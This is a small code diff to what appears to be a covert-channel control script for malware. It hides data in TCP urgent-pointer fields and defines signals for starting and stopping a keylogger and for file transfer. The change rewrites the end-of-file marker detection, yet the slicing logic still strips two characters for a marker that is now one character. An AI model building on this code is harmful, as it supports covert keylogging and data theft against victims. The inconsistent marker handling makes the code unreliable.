@@ -28,7 +28,7 @@ local_ip = get_local_ip()
 source_port = 80
 dest_port = 80
 received_data = ""
-eof_signal = 12353
+eof_signal = "\x00"
 keylogger_start_signal = 1
 keylogger_stop_signal = 2
 file_transfer_signal = 3
@@ -105,11 +105,9 @@ def signal_callback(packet):
         received_chunks += 1
         print(f"Received chunk #{received_chunks}: {urgent_pointer_value}")
         
-        # Check for "//" EOF marker
-        if urgent_pointer_value == eof_signal:
+        if received_data.endswith(eof_signal):
             print(f"EOF marker detected. Total chunks received: {received_chunks}")
             try:
-                # Remove the "//" EOF marker
                 data_to_process = received_data[:-2]
                 # Add padding if necessary
                 padding_needed = len(data_to_process) % 4
